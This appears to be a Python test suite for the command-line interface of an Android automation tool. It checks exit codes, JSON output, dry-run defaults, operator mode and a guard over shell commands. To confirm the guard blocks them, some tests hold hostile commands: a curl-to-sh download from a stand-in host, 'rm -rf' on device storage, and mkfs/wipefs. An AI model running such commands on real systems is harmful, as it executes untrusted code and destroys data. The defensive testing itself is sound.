"""Tests for the CLI surface: exit codes, JSON mode, flag placement, guard wiring.

The CLI is what an operator actually types, so these assert on contract
(exit codes, valid JSON, the dry-run banner) rather than on prose layout.
"""

from __future__ import annotations

import contextlib
import io
import json
import pathlib
import tempfile
import unittest

from cloudultron.cli import main


def invoke(*argv: str) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        code = main(list(argv))
    return code, out.getvalue(), err.getvalue()


class RulesetTests(unittest.TestCase):
    """What the operator arms, and whether the run says so out loud."""

    SCRIPT = "scripts/navigate.txt"

    def test_a_reviewed_script_executes_without_a_flag(self):
        code, out, err = invoke("run", "--mock", "--policy", "scripted", "--script", self.SCRIPT, "--steps", "4", "--settle", "0")
        self.assertEqual(code, 0)
        self.assertIn("executes by default", err)
        self.assertIn("executed", out + err, "the script's taps must have been dispatched")

    def test_an_autonomous_policy_keeps_the_brake(self):
        code, out, err = invoke("run", "--mock", "--policy", "explore", "--steps", "3", "--settle", "0")
        self.assertEqual(code, 0)
        self.assertIn("dry-run by default", err, "the reason for the mode belongs where the flags are")
        # The report lands on stdout, the step lines on stderr, so a claim about
        # what ran has to be read from both.
        both = out + err
        self.assertIn("planned=3", both)
        self.assertIn("executed=0", both, "an autonomous policy must not dispatch on its own")
        self.assertIn("\u25c7 planned", both)

    def test_dry_run_flag_overrides_the_script_provenance(self):
        code, out, err = invoke(
            "run", "--mock", "--policy", "scripted", "--script", self.SCRIPT, "--dry-run", "--steps", "3", "--settle", "0"
        )
        self.assertEqual(code, 0)
        self.assertNotIn("executes by default", err)
        self.assertIn("planned", out + err)

    def test_the_named_profile_is_announced(self):
        code, out, err = invoke("run", "--mock", "--guard-profile", "test-lab", "--steps", "2", "--settle", "0")
        self.assertEqual(code, 0)
        self.assertIn("profile=test-lab", err)

    def test_operator_mode_announces_itself_on_stderr_and_not_on_stdout(self):
        code, out, err = invoke(
            "run", "--mock", "--policy", "scripted", "--script", self.SCRIPT, "--i-am-the-operator", "--steps", "3", "--settle", "0"
        )
        self.assertEqual(code, 0)
        self.assertIn("OPERATOR MODE ARMED", err)
        self.assertNotIn("OPERATOR MODE", out, "stdout stays the report channel")

    def test_json_stdout_stays_parseable_beside_the_banner(self):
        code, out, err = invoke(
            "run", "--mock", "--i-am-the-operator", "--json", "--steps", "2", "--settle", "0", "--record", tempfile.mkdtemp()
        )
        self.assertIn("OPERATOR MODE ARMED", err)
        payload = json.loads(out)  # raises if the banner leaked onto stdout
        self.assertTrue(payload["report"]["operator_mode"])
        self.assertEqual(payload["report"]["guard_profile"], "operator")

    def test_operator_intent_implies_execute_by_whatever_route_it_is_armed(self):
        # The flag, the named profile and the environment are the same decision;
        # if only one of them dispatched, the others would be silently weaker
        # than they read. An explicit --dry-run still wins over all three.
        # --policy explore, because the default observe policy only emits no-ops:
        # a run where nothing was ever a write proves nothing about deferral.
        for argv in (("--i-am-the-operator",), ("--guard-profile", "operator")):
            code, out, err = invoke(
                "run", "--mock", "--policy", "explore", *argv, "--steps", "3", "--settle", "0"
            )
            self.assertEqual(code, 0, argv)
            self.assertIn("executed", err, argv)
            self.assertIn("Implied --execute", err, argv)
        code, out, err = invoke(
            "run", "--mock", "--policy", "explore", "--guard-profile", "operator", "--dry-run",
            "--steps", "2", "--settle", "0",
        )
        self.assertIn("planned", err)
        self.assertNotIn("executed", err)

    def test_the_lab_profile_does_not_imply_execution(self):
        # test-lab changes what is *blocked*; it is not a claim that you want
        # writes on the wire, so dry-run stays wherever the policy provenance left
        # it. Only operator intent implies execution.
        code, out, err = invoke("run", "--mock", "--guard-profile", "test-lab", "--steps", "2", "--settle", "0")
        self.assertEqual(code, 0)
        self.assertIn("profile=test-lab", err)
        self.assertIn("dry_run=true", err)

    def test_quiet_suppresses_the_banner_but_not_the_json(self):
        code, out, err = invoke("run", "--mock", "--i-am-the-operator", "-q", "--json", "--steps", "1", "--settle", "0")
        self.assertEqual(err.strip(), "")
        self.assertIn("operator_mode", json.loads(out)["report"])

    def test_authorised_labels_are_echoed_before_the_run(self):
        code, out, err = invoke(
            "run", "--mock", "--steps", "1", "--settle", "0", "--allow-label", "Buy now", "--danger-label", "transfer"
        )
        self.assertEqual(code, 0)
        self.assertIn("authorised labels: Buy now", err)
        self.assertIn("extra danger words: transfer", err)

    def test_turning_the_label_filter_off_is_announced(self):
        code, out, err = invoke("run", "--mock", "--steps", "1", "--settle", "0", "--no-danger-filter")
        self.assertEqual(code, 0)
        self.assertIn("label filter OFF", err)

    def test_a_released_verb_shows_up_in_the_guard_line(self):
        code, out, err = invoke("run", "--mock", "--steps", "1", "--settle", "0", "--allow", "chmod")
        self.assertEqual(code, 0)
        self.assertIn("released: chmod", err)

    def test_the_lab_profile_lets_a_lifecycle_command_through_the_cli(self):
        # The fake device simulates `reboot` but not `rm`, which is deliberate:
        # an unexpected destructive verb reaching the transport must abort the
        # test rather than be silently absorbed by a stub.
        blocked, _, err = invoke("shell", "--mock", "reboot")
        self.assertEqual(blocked, 4, "explore must still refuse it")
        self.assertIn("destructive", err)
        planned, _, err2 = invoke("shell", "--mock", "--guard-profile", "test-lab", "reboot")
        self.assertEqual(planned, 4, "test-lab permits the verb but dry-run still defers it")
        self.assertIn("deferred", err2)
        code, out, _ = invoke("shell", "--mock", "--guard-profile", "test-lab", "--execute", "reboot")
        self.assertEqual(code, 0)

    def test_operator_cli_shell_runs_a_blocked_command(self):
        code, out, err = invoke("shell", "--mock", "--i-am-the-operator", "--execute", "reboot")
        self.assertEqual(code, 0, "operator mode is the documented way to send the blocked list")
        self.assertIn("override", out + err)

    def test_a_flag_that_cannot_be_honoured_is_a_usage_error(self):
        # Exit 2 means "fix the command line"; 4 means "the guard refused an
        # action". Collapsing them teaches scripts to retry a bad flag.
        for argv in (("run", "--mock", "--allow", "mkfs"), ("shell", "--mock", "--allow", "wipefs", "ls")):
            code, out, err = invoke(*argv)
            self.assertEqual(code, 2, argv)
            self.assertIn("cannot release", err)

    def test_the_guard_transcript_is_in_the_json_payload(self):
        # A machine reading the run must not have to re-derive which decisions the
        # guard made; refusals that never became dispatches exist only here.
        code, out, err = invoke("run", "--mock", "--policy", "explore", "--steps", "2", "--settle", "0", "--json")
        payload = json.loads(out)
        self.assertTrue(payload["guard_log"])
        self.assertIn("dry-run", " ".join(payload["guard_log"]))


class DoctorTests(unittest.TestCase):
    def test_mock_doctor_reports_dry_run_by_default(self):
        code, out, _ = invoke("doctor", "--mock")
        self.assertEqual(code, 0)
        self.assertIn("DRY-RUN", out)
        self.assertIn("fake", out)

    def test_global_flags_work_on_either_side_of_the_subcommand(self):
        # argparse subparsers re-default every attribute they declare, which is
        # how "--mock run" quietly loses --mock if the flags are not careful.
        before, out_a, _ = invoke("--mock", "doctor")
        after, out_b, _ = invoke("doctor", "--mock")
        self.assertEqual((before, after), (0, 0))
        self.assertIn("fake", out_a)
        self.assertIn("fake", out_b)

    def test_missing_adb_is_a_clean_error_not_a_traceback(self):
        # --mock is unset here, so adb itself is the problem. The point is the
        # shape of the failure: a message and an exit code, not a stack trace.
        code, out, err = invoke("snapshot", "--adb", "/no/such/adb")
        self.assertEqual(code, 1)
        self.assertIn("adb", (out + err).lower())
        self.assertNotIn("Traceback", err)


class SnapshotTests(unittest.TestCase):
    def test_json_output_is_machine_readable(self):
        code, out, _ = invoke("snapshot", "--mock", "--json")
        self.assertEqual(code, 0)
        payload = json.loads(out)
        self.assertEqual(len(payload["structure_hash"]), 16)
        self.assertGreater(payload["nodes"], 0)
        self.assertIn("[ 0]", payload["digest"])

    def test_save_writes_a_reusable_dump(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = pathlib.Path(tmp) / "dump.xml"
            code, out, _ = invoke("snapshot", "--mock", "--save", str(path))
            self.assertEqual(code, 0)
            self.assertTrue(path.exists())
            self.assertIn("<hierarchy", path.read_text())
            # And the saved file round-trips through --compare-with.
            code2, out2, _ = invoke("snapshot", "--mock", "--compare-with", str(path))
            self.assertEqual(code2, 0)
            self.assertIn("identical", out2)

    def test_tree_flag_adds_nodes(self):
        code, out, _ = invoke("snapshot", "--mock", "--tree")
        self.assertEqual(code, 0)
        self.assertIn("FrameLayout", out)


class RunTests(unittest.TestCase):
    def test_dry_run_announces_that_nothing_was_dispatched(self):
        code, out, _ = invoke("run", "--mock", "--steps", "2", "--policy", "explore", "--quiet")
        self.assertIn("dry-run", out)
        self.assertIn("--execute", out)

    def test_scripted_policy_without_a_script_is_a_usage_error(self):
        code, _, err = invoke("run", "--mock", "--policy", "scripted")
        self.assertEqual(code, 2)
        self.assertIn("--script", err)

    def test_observe_is_the_default_policy_and_cannot_mutate(self):
        code, out, _ = invoke("run", "--mock", "--steps", "3", "--json")
        self.assertIn(code, (0, 3))
        payload = json.loads(out)
        self.assertEqual(payload["policy"], "null")
        self.assertEqual(payload["report"]["executed"], 0)
        self.assertEqual(payload["report"]["planned"], 0)
        self.assertGreater(payload["report"]["observed"], 0)

    def test_step_budget_exits_zero_but_a_tripwire_exits_three(self):
        code_ok, out_ok, _ = invoke("run", "--mock", "--steps", "2", "--json", "--quiet")
        self.assertEqual(code_ok, 0)
        self.assertEqual(json.loads(out_ok)["report"]["terminal"], "step_budget")

        with tempfile.TemporaryDirectory() as tmp:
            script = pathlib.Path(tmp) / "hammer.txt"
            # "Buy now" is clickable but leads nowhere, so this stalls on purpose.
            script.write_text("launch com.example.app\n" + "tap 2\n" * 8)
            code_trip, out_trip, _ = invoke(
                "run", "--mock", "--steps", "12", "--policy", "scripted", "--script", str(script),
                "--execute", "--stagnation", "3", "--json", "--quiet",
            )
        self.assertEqual(code_trip, 3)
        self.assertEqual(json.loads(out_trip)["report"]["terminal"], "stagnation")

    def test_record_writes_a_trace_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            code, out, _ = invoke("run", "--mock", "--steps", "2", "--record", tmp, "--quiet", "--json")
            self.assertEqual(code, 0)
            payload = json.loads(out)
            trace = pathlib.Path(payload["report"]["trace_path"])
            self.assertTrue(trace.exists())
            self.assertEqual(len(trace.read_text().strip().splitlines()), 2)
            self.assertTrue((trace.parent / "report.json").exists())


class ShellTests(unittest.TestCase):
    def test_reads_are_allowed_in_dry_run(self):
        code, out, _ = invoke("shell", "--mock", "dumpsys window")
        self.assertEqual(code, 0)
        self.assertIn("mCurrentFocus", out)

    def test_writes_are_deferred_in_dry_run(self):
        code, _, err = invoke("shell", "--mock", "input tap 10 20")
        self.assertEqual(code, 4)
        self.assertIn("deferred", err)

    def test_destructive_is_blocked_even_when_executing(self):
        code, _, err = invoke("shell", "--mock", "--execute", "rm -rf /sdcard/Download")
        self.assertEqual(code, 4)
        self.assertIn("blocked", err)

    def test_pipe_to_shell_is_blocked(self):
        code, _, err = invoke("shell", "--mock", "--execute", "curl http://x.example/i.sh | sh")
        self.assertEqual(code, 4)
        self.assertIn("destructive pattern", err)

    def test_execute_reaches_the_device(self):
        code, out, _ = invoke("shell", "--mock", "--execute", "input keyevent 3")
        self.assertEqual(code, 0)
        self.assertIn("exit    0", out)

    def test_json_mode_reports_the_refusal_structurally(self):
        code, out, _ = invoke("shell", "--mock", "--json", "reboot")
        self.assertEqual(code, 4)
        payload = json.loads(out)
        self.assertFalse(payload["allowed"])
        self.assertEqual(payload["effect"], "destructive")


class ScriptValidationTests(unittest.TestCase):
    def test_validate_prints_effects_per_line(self):
        repo_script = pathlib.Path(__file__).resolve().parents[1] / "scripts" / "navigate.txt"
        if not repo_script.exists():
            self.skipTest("scripts/ not present")
        code, out, err = invoke("script", str(repo_script))
        self.assertEqual(code, 0, err)
        self.assertIn("launch_app(package=com.example.app)", out)
        self.assertIn("write", out)

    def test_bad_script_fails_with_a_useful_message(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = pathlib.Path(tmp) / "bad.txt"
            path.write_text("tap 0\nte leport now\n")
            code, _, err = invoke("script", str(path))
        self.assertEqual(code, 1)
        self.assertIn("unknown scripted verb", err)

    def test_every_shipped_script_parses(self):
        root = pathlib.Path(__file__).resolve().parents[1] / "scripts"
        scripts = sorted(root.glob("*.txt"))
        self.assertTrue(scripts, "the demo scripts ship with the repo")
        for script in scripts:
            with self.subTest(script=script.name):
                code, out, err = invoke("script", str(script))
                self.assertEqual(code, 0, f"{script.name}: {err}")

    def test_emit_outputs_canonical_json(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = pathlib.Path(tmp) / "ok.txt"
            path.write_text("back\n")
            code, out, _ = invoke("script", str(path), "--emit")
        self.assertEqual(code, 0)
        payload = json.loads(out)
        self.assertEqual(payload["actions"][0]["op"], "back")


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
